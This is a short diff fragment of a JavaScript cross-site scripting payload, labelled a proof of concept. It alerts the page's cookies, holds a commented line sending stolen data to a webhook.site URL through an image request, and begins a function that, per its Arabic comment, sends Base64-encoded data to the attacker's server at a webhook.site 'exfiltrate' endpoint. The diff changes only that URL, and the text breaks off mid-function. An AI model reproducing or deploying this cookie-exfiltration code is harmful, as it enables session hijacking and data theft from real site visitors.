@@ -6,7 +6,7 @@ alert("XSS PoC: Script injected! Cookies visible in console: " + document.cookie
 //new Image().src = "https://webhook.site/01958d43-9c63-44e0-85c8-4df93c65ec75/log?data=" + encodeURIComponent(stolenData);
 
 (function() {
-    const attackerURL = "https://webhook.site/01958d43-9c63-44e0-85c8-4df93c65ec75/exfiltrate";
+    const attackerURL = "https://webhook.site/01958d43-9c63-44e0-85c8-4df93c65ec75/exfiltrate=";
 
     // 1. وظيفة التهريب: ترسل البيانات مشفرة Base64 إلى سيرفر المهاجم
     function sendHome(data, type) {
